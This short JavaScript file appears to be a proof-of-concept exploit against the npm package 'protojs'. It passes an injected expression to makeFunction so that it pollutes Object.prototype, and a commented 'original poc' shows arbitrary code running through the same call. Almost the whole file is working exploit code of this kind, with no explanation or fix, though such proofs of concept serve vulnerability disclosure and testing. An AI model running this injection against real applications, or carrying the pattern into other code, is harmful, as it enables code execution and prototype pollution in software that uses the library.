var _ = require("protojs");

_.makeFunction("a", "b", "1+(this.constructor.prototype.polluted=`yes`)");
console.log({}.polluted);

/*orginal poc

var _ = require('protojs');

_.makeFunction('a','b', 'console.log("hacked")');

*/
